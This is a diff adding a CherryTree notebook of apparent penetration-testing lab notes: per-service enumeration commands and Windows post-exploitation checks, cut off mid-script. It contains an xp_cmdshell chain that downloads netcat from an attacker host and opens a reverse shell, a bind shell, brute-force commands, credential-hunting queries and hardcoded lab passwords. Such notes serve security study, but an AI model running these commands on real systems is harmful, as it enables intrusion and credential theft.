@@ -1,0 +1,2134 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Services" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1632922798" ts_lastsave="1633358843">
+    <rich_text>{nmap_extra} = -vv --reason -Pn
+{scandir} =
+
+</rich_text>
+    <rich_text scale="h3">Banner Grabbing:</rich_text>
+    <rich_text>
+nc -nv {address} {port}
+This technique is used to confirm services.
+
+</rich_text>
+    <rich_text scale="h3">SSL:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">if [ "{secure}" == "True" ]; then sslscan --show-certificate --no-colour {address}:{port} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_sslscan.txt"; fi</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Cassandra: </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV  -p {port} --script="banner,(cassandra* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Cups:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(cups* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Distcc:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd=id" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">DNS:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(dns* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Finger:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,finger" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">FTP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(ftp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+ftp {address}
+If no credentials, then
+USER: Anonymous
+PASS: Anonymous
+
+When transferring .exe file through ftp, type binary in the ftp server
+ftp&gt; binary
+200 Type set to I.
+ftp&gt; 
+
+put is for uploading files in ftp server
+
+wget -m </rich_text>
+    <rich_text link="webs ftp://steph:billabong@10.1.1.68/">ftp://steph:billabong@10.1.1.68/</rich_text>
+    <rich_text>
+
+Use FTP passive mode if you can't connect to it via authorized list of IP addresses
+
+</rich_text>
+    <rich_text scale="h3">HTTP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">curl -sSik {scheme}://{address}:{port}/ -m 10 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_{scheme}_index.html"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">curl -sSik {scheme}://{address}:{port}/robots.txt -m 10 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_{scheme}_robots.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">if hash wkhtmltoimage 2&gt; /dev/null; then wkhtmltoimage --format png {scheme}://{address}:{port}/ {scandir}/{protocol}_{port}_{scheme}_screenshot.png; fi</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">whatweb --color=never --no-errors -a 3 -v {scheme}://{address}:{port} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_{scheme}_whatweb.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">feroxbuster -u {scheme}://{address}:{port} -t 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -o {scandir}/{protocol}_{port}_{scheme}_feroxbuster.txt</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">gobuster dir -u http://{address} -w /usr/share/wordlists/dirb/big.txt -x txt,php,asp,aspx,html,sql,htc</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">nikto -host=</rich_text>
+    <rich_text underline="single" link="webs http://10.1.1.89" scale="small" foreground="#1155cc">http://</rich_text>
+    <rich_text scale="small">{address}</rich_text>
+    <rich_text>
+
+hydra -l Kurius -P kurius-cewl.txt hackitforward.com http-post-form "/admin/login/?next=/admin/:csrfmiddlewaretoken=nIEiyQs7xz3tecTazxrsAHBUvXI1ZYTErRpmx59EWDleoCoRP4pJRlAEbsHzYGDW&amp;username=^USER^&amp;password=^PASS^&amp;next=%2Fadmin%2F:F=Please enter the correct username and password for a staff account. Note that both fields may be case-sensitive." -V
+
+To brute force with wps, you can run this: wpscan --url http://10.10.85.82/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+
+you can use wpscan to scan for vulnerable plugins and users, wpscan --url http://10.10.85.82/blog -e  vp,u 
+
+To get the headers from the web server and default landing page, run this:
+curl -i 10.11.1.71
+
+zaproxy {ip address}
+</rich_text>
+    <rich_text scale="h3">IMAP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(imap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Kerberos:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,krb5-enum-users" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">LDAP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">enum4linux -a -M -l -d {address} 2&gt;&amp;1 | tee "{scandir}/enum4linux.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">MongoDB</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(mongodb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">MSSQL:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(ms-sql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="mssql.instance-port={port},mssql.username=sa,mssql.password=sa" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">MySQL:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+psexec.py sqlserver:"shantewhite"@10.11.1.121 cmd.exe
+PsExec64.exe -i -accepteula -d -s C:\Users\alice\Desktop\rev_0333.exe
+
+mysql -uroot -pzaq1xsw2cde3 -e 'show databases;'
+
+Attack vector #1
+python3 mssqlclient.py 'CHIMERA/sa:CrimsonQuiltScalp193'@10.1.1.68
+
+SQL&gt;  xp_cmdshell “(powershell (Invoke-WebRequest -Uri http://10.1.1.246:8000/ncx64.exe -OutFile ncx64.exe)”
+
+sean@sean:~$ nc -lnvp 4444
+
+SQL&gt; xp_cmdshell "C:\\Users\steph\.android\ncx64.exe 10.1.1.246 4444 -e cmd.exe"
+
+sean@sean (gains reverse shell)
+
+</rich_text>
+    <rich_text scale="h3">NFS:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(rpcinfo or nfs*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">showmount -e {address} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_showmount.txt</rich_text>
+    <rich_text>
+
+mkdir /mnt/kenobiNFS
+mount machine_ip:/var /mnt/kenobiNFS
+ls -la /mnt/kenobiNFS
+
+scp /home/kali/Downloads/linpeas.sh jan@10.10.177.192:/dev/shm
+
+</rich_text>
+    <rich_text scale="h3">NNTP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,nntp-ntlm-info" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Oracle:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(oracle* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">tnscmd10g ping -h {address} -p {port} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_oracle_tnscmd_ping.txt" </rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">tnscmd10g version -h {address} -p {port} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_oracle_tnscmd_version.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">tnscmd10g version -h {address} -p {port} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_oracle_tnscmd_version.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">oscanner -v -s {address} -P {port} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_oracle_scanner.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">POP3:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(pop3* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">RMI:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,rmi-vuln-classloader,rmi-dumpregistry" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">RPC:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,msrpc-enum,rpc-grind,rpcinfo" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">SIP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,sip-enum-users,sip-methods" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">svwar -D -m INVITE -p {port} {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">SSH:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" {address}</rich_text>
+    <rich_text>
+
+If you found an id_rsa, you can use it:
+ssh -i id_rsa kenobi@10.10.105.61
+
+When it comes to SSH, we are interested in:
+    -SSH package version - Might be able to find the OS and version.
+    -SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
+    -SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)
+
+</rich_text>
+    <rich_text scale="h3">SMB:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">enum4linux -a -M -l -d {address} 2&gt;&amp;1 | tee "{scandir}/enum4linux.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">nbtscan -rvh {address} 2&gt;&amp;1 | tee "{scandir}/nbtscan.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">smbclient -L\\ -N -I {address} 2&gt;&amp;1 | tee "{scandir}/smbclient.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">smbmap -H {address} -P {port} 2&gt;&amp;1 | tee -a "{scandir}/smbmap-share-permissions.txt"; smbmap -u null -p "" -H {address} -P {port} 2&gt;&amp;1 | tee -a "{scandir}/smbmap-share-permissions.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">smbmap -H {address} -P {port} -R 2&gt;&amp;1 | tee -a "{scandir}/smbmap-list-contents.txt"; smbmap -u null -p "" -H {address} -P {port} -R 2&gt;&amp;1 | tee -a "{scandir}/smbmap-list-contents.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">smbmap -H {address} -P {port} -x "ipconfig /all" 2&gt;&amp;1 | tee -a "{scandir}/smbmap-execute-command.txt"; smbmap -u null -p "" -H {address} -P {port} -x "ipconfig /all" 2&gt;&amp;1 | tee -a "{scandir}/smbmap-execute-command.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">To list SMB shares:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">smbclient -L \\\\{address}\\ -U Anonymous OR smbclient -L \\\\{address}\\ -U Guest</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">PASS: Anonymous OR Guest</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">To view shares:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">smbclient \\\\{address}//{Share} -U Anonymous OR smbclient -L \\\\{address}//{Share} -U Guest</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">PASS: Anonymous OR Guest</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">SMTP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(smtp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">smtp-user-enum -M VRFY -U "{username_wordlist}" -t {address} -p {port} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_smtp_user-enum.txt"</rich_text>
+    <rich_text>
+
+When it comes to SMTP, we can connect to the server: nc -nv 10.11.1.72 25 and run EXPN to extract mailing list or VRFY to verify email address
+
+</rich_text>
+    <rich_text scale="h3">SNMP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -dd {address} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_onesixtyone.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 1.3.6.1.2.1.25.1.6.0 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk_system_processes.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 1.3.6.1.2.1.25.4.2.1.2 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk_running_processes.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 1.3.6.1.2.1.25.4.2.1.4 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk_process_paths.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 1.3.6.1.2.1.25.4.2.1.4 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk_process_paths.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 1.3.6.1.2.1.25.6.3.1.2 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk_software_names.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 1.3.6.1.4.1.77.1.2.25 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk_user_accounts.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">snmpwalk -c public -v 1 {address} 1.3.6.1.2.1.6.13.1.3 2&gt;&amp;1 | tee "{scandir}/{protocol}_{port}_snmp_snmpwalk_tcp_ports.txt"</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="small">Port UDP: 161</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Telnet:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,telnet-encryption,telnet-ntlm-info" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">TFTP:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,tftp-enum" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">VNC:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">nmap {nmap_extra} -sV -p {port} --script="banner,(vnc* or realvnc* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" {address}</rich_text>
+    <rich_text>
+
+</rich_text>
+  </node>
+  <node name="Port Forwarding and Port Tunneling" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633349850" ts_lastsave="1633350003">
+    <rich_text>run sshuttle -r sean@10.11.1.251 10.1.1.0/24</rich_text>
+  </node>
+  <node name="IP Spoofing" unique_id="17" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633350003" ts_lastsave="1633350005">
+    <rich_text>USe the Forwarded-For extension on Firefox to spoof the ip</rich_text>
+  </node>
+  <node name="Autorecon" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633349281" ts_lastsave="1633349284">
+    <rich_text>sudo env "PATH=$PATH" autorecon</rich_text>
+  </node>
+  <node name="Stuck???" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633295771" ts_lastsave="1633349581">
+    <rich_text>Increase number of ports that are being scanned
+
+Capture traffic via wireshark if you don’t understand the outcome of your operations
+
+Take a break
+
+When you a very different directory in a website, run gosbuster on it
+
+If authentication via web page doesn't work, check the technology powering the website on searchsploit
+
+Here is information that is worth gathering:
+    Web Application - 
+    Web Technologies - 
+    Web Server - 
+    SSH Service - 
+    Database - 
+    OS - 
+
+Read through entire exploit script
+If something doesn’t work after 30 mins of trying harder, move on to something else
+
+     Take the time to explore the target on your own, without using external lists of commands or enumeration scripts (as a crutch). It is only through exploration, experimentation, reflection, and a boat-load of trial and error that your skills will improve.
+Do not waste time mindlessly running commands or scripts: think about what you are trying to do, form a theory, and then test it.
+Always try to understand code before running it 
+    Taking a break at least once every 90 minutes is highly recommended
+    30 min timer
+    What do we think we know about the machine?
+    What evidence have we observed to support our beliefs?
+    How confident are we in the accuracy of our hypotheses?
+    What tests can we perform in order to increase (or decrease) our confidence?
+    Always try to reason under uncertainty
+    Pentesting is never emotion-driven, we must pay attention to each service equally
+    Smaller scans to bigger scans instead of using autorecon to start off
+     PAY ATTENTION TO ALL PORTS
+     In order to ensure that we do not get stuck endlessly plugging away at one aspect of the machine, we are going to use the timer method extensively. We'll set a pre-determined amount of time for each service, and cycle through the list using the above algorithm. Once the timer goes off, we STOP no matter what and move on to the next item on the list. This has several advantages:   
+python /tmp/beta.py 10.11.1.72
+    The lesson here is that enumeration and gathering as much information as possible before trying to exploit a target might appear time consuming, but it is also the best way to test your theories and beliefs about the machine. As mentioned earlier, Penetration Testing is about reasoning under uncertainty
+    Keeps us fresh, we won't get bored or frustrated as easily
+    Make sure we leave no stone unturned (eventually we'll restart back at the top and continue where we left off).
+    Promotes excellent note-taking. Since we only have a limited amount of time and we're forcing ourselves to stop when the timer goes off, we'll need to make sure to note down everything we find.
+    
+    Review sensitive information highlighted in red
+    
+    Brute force services
+</rich_text>
+  </node>
+  <node name="Reverse Shell Enumeration" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1633113426" ts_lastsave="1633297744">
+    <rich_text>Check this video if you are dealing with low level windows reverse shell: https://www.youtube.com/watch?v=Op4s5e8gL0o :
+Summary of video:
+windows : nc -Lp 31337 -vv -e cmd.exe  (you must have nc.exe installed on machine)
+kali: nc 10.11.1.10 31337
+
+In Windows, ls = dir
+
+</rich_text>
+    <rich_text scale="h1">Windows:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2">To viiew all the privileges. run this:</rich_text>
+    <rich_text>
+whoami /priv
+
+</rich_text>
+    <rich_text scale="h2">To do an access check on Windows OS, run this:</rich_text>
+    <rich_text>
+C://Users: powershell
+C://Users: Get-ChildItem "C:\Program Files" - Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+
+</rich_text>
+    <rich_text scale="h2">To find drivers and kernel modules on Windows OS, run this:</rich_text>
+    <rich_text>
+C://User: Powershell
+C://User: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+
+</rich_text>
+    <rich_text scale="h2">To find the version of each driver and kernel module, run this:</rich_text>
+    <rich_text>
+C://Users: Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+
+</rich_text>
+    <rich_text scale="h2">To enumerate binaries that autoelevate on Windows OS, run this:</rich_text>
+    <rich_text>
+C://User: reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+
+</rich_text>
+    <rich_text scale="h2"># Powershell whoami</rich_text>
+    <rich_text>
+$env:UserName
+
+</rich_text>
+    <rich_text scale="h2"># Display hidden files</rich_text>
+    <rich_text>
+dir /a 
+
+</rich_text>
+    <rich_text scale="h2"># Recursive dir</rich_text>
+    <rich_text>
+dir /s
+
+</rich_text>
+    <rich_text scale="h2"># If you can't browse a folder because of space char
+# You can use an old trick
+# It has to be 8 chars </rich_text>
+    <rich_text>
+cmd&gt; cd progra~1
+cmd&gt; cd progra~2
+
+</rich_text>
+    <rich_text scale="h2"># Exact OS version</rich_text>
+    <rich_text>
+type C:/Windows/system32/eula.txt
+
+type C:\Windows\System32\drivers\etc\hosts
+
+</rich_text>
+    <rich_text scale="h2"># OS Arch</rich_text>
+    <rich_text>
+systeminfo
+wmic qfe
+
+</rich_text>
+    <rich_text scale="h2"># Envionment variables ? DC on the logon server ? </rich_text>
+    <rich_text>
+set
+powershell&gt; Get-ChildItem Env: | ft Key,Value
+
+</rich_text>
+    <rich_text scale="h2"># Other connecte drives ?</rich_text>
+    <rich_text>
+net use
+wmic logicaldisk get caption,description,providername
+powershell&gt; Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+
+</rich_text>
+    <rich_text scale="h2"># NIC Connected</rich_text>
+    <rich_text>
+ipconfig /all
+powershell&gt; Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+powershell&gt; Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+
+</rich_text>
+    <rich_text scale="h2"># Routes</rich_text>
+    <rich_text>
+route print
+powershell&gt; Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+
+</rich_text>
+    <rich_text scale="h2"># ARP Cache</rich_text>
+    <rich_text>
+arp -a
+powershell&gt; Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+
+</rich_text>
+    <rich_text scale="h2"># Connection to other hosts</rich_text>
+    <rich_text>
+netstat -ano
+
+</rich_text>
+    <rich_text scale="h2"># Hosts file</rich_text>
+    <rich_text>
+C:\WINDOWS\System32\drivers\etc\hosts
+
+</rich_text>
+    <rich_text scale="h2"># Firewall</rich_text>
+    <rich_text>
+netsh advfirewall show allprofiles state
+netsh advfirewall firewall show rule name=all
+netsh advfirewall export "firewall.txt"
+
+</rich_text>
+    <rich_text scale="h2"># Is SNMP configured ?</rich_text>
+    <rich_text>
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+powershell&gt; Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+
+</rich_text>
+    <rich_text scale="h2"># SID for local user or logged in local user</rich_text>
+    <rich_text>
+wmic useraccount where name='username' get sid
+wmic useraccount where name='%username%' get sid
+
+</rich_text>
+    <rich_text scale="h2"># SID for current logged in domain user</rich_text>
+    <rich_text>
+whoami /user
+
+</rich_text>
+    <rich_text scale="h2"># SID for local administrator</rich_text>
+    <rich_text>
+wmic useraccount where (name='administrator' and domain='%computername%') get name,sid
+
+</rich_text>
+    <rich_text scale="h2"># SID for domain administrator</rich_text>
+    <rich_text>
+wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid
+
+</rich_text>
+    <rich_text scale="h2"># Find a username from a SID</rich_text>
+    <rich_text>
+wmic useraccount where sid='S-1-3-12-1234525106-3567804255-30012867-1437' get name
+
+</rich_text>
+    <rich_text scale="h2"># Looking for privileges and searching for one of these
+# SeBackupPrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege, SeTcbPrivilege
+# SeCreateToken Privilege, SeLoadDriver Privilege, SeImpersonate </rich_text>
+    <rich_text>
+whoami /priv
+net users
+dir /b /ad “C:\Documents and Settings”
+reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon” 2&gt;nul | findstr “DefaultUserName DefaultDomainName DefaultPassword”
+net user alice
+echo %username%
+
+</rich_text>
+    <rich_text scale="h2"># Get all users (old users?)</rich_text>
+    <rich_text>
+net users
+dir /b /ad "C:\Users\"
+dir /b /ad "C:\Documents and Settings\" # Windows XP and below
+powershell&gt; Get-LocalUser | ft Name,Enabled,LastLogon
+powershell&gt; Get-ChildItem C:\Users -Force | select Name
+
+</rich_text>
+    <rich_text scale="h2"># Informations about all local users</rich_text>
+    <rich_text>
+powershell&gt; Get-WmiObject  -Class Win32_UserAccount  -Filter "LocalAccount=1" | % {net user $_.Name}
+powershell&gt; Get-LocalUser | %{net user $_.name}
+
+</rich_text>
+    <rich_text scale="h2"># Logged on users</rich_text>
+    <rich_text>
+qwinsta
+quser
+
+</rich_text>
+    <rich_text scale="h2"># Groups</rich_text>
+    <rich_text>
+powershell&gt; Get-LocalGroup | ft Name
+powershell&gt; Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+
+</rich_text>
+    <rich_text scale="h2"># Get domain</rich_text>
+    <rich_text>
+powershell&gt; wmic computersystem get domain
+powershell&gt; systeminfo | findstr /B /C:"Domain"
+
+</rich_text>
+    <rich_text scale="h2"># Domain
+# /dom could be a way to avoid endpoint solutions detection</rich_text>
+    <rich_text>
+powershell&gt; net user /dom
+powershell&gt; net user /domain
+powershell&gt; net user /domain &lt;username&gt;
+powershell&gt; net group /domain
+
+</rich_text>
+    <rich_text scale="h2"># Get you own SID</rich_text>
+    <rich_text>
+powershell&gt; wmic useraccount where name='&lt;username&gt;' get sid
+# Registry for user autologon ?
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+powershell&gt; Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+
+</rich_text>
+    <rich_text scale="h2"># Credential Manager ? </rich_text>
+    <rich_text>
+cmdkey /list
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+powershell&gt; Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+powershell&gt; Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+# Get domain SPN
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$search.filter = "(servicePrincipalName=*)"
+$results = $search.Findall()
+foreach($result in $results)
+{
+    $userEntry = $result.GetDirectoryEntry()
+    Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
+    Write-host "SPNs"        
+    foreach($SPN in $userEntry.servicePrincipalName)
+    {
